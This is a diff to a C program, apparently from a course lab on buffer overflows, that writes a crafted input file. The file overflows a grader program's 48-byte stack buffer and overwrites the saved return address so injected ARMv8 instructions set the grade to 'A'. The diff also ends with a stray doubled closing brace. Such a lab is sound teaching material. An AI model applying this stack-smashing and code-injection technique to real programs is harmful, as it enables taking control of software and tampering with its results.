@@ -1,13 +1,44 @@
 /*--------------------------------------------------------------------*/
-/* createDataA.c                                                      */
+/* createdataA.c                                                      */
 /* Author: David Hovey                                                */
 /*--------------------------------------------------------------------*/
+/*
+  Produces a file called dataA which causes the grader program
+  to assign a grade of 'A' even though the original grader program
+  never assigns an A.
+
+  The produced file overflows readString's stack frame and overwrites
+  getName's saved x30 with the address of injected machine instructions
+  that load the address of global grade variable into x0, move
+  'A' into w1, set grade = 'A', then return (branch) to the main program.
+*/
+
 
 #include "miniassembler.h"
 #include <stdio.h>
 #include <string.h>
 
-/* MAIN COMMENT */
+
+
+/*
+   main
+
+   Writes a crafted binary file named "dataA" which contains:
+      - the name (David) and a null terminator,
+      - padding bytes to maintain 4 byte alignment,
+      - four ARMv8 machine instructions created w/ miniassembler
+      - additional padding to fill readString 48 byte buffer,
+      - a final overwritten return address pointing into the
+        injected instructions.
+
+   The function...
+      - accepts no command line args
+      - does not read from stdin
+      - write binary data only to "dataA"
+      - returns 0 on success, prints no normal output
+      - prints an error message if fopen fails
+
+*/
 int main() {
     /* User name */
     char name[] = "David";
@@ -33,9 +64,15 @@ int main() {
     /* Address of first adr... instruction */
     unsigned long returnAddress = 0x420060;
 
+    /* Open dataA for writing the crafted input bytes. */
     FILE *psFile = fopen("dataA", "w");
 
+    if (!psFile) {
+        perror("fopen did not return a valid pointer");
+        return 1;
+    }
 
+    /* Write the assembly code into binary */
     adrInstr = MiniAssembler_adr(0, 0x420044, 0x420060);
     movInstr = MiniAssembler_mov(1, 0x41);
     strbInstr = MiniAssembler_strb(1, 0);
@@ -62,4 +99,4 @@ int main() {
     fclose(psFile);
 
     return 0;
-}
+}}
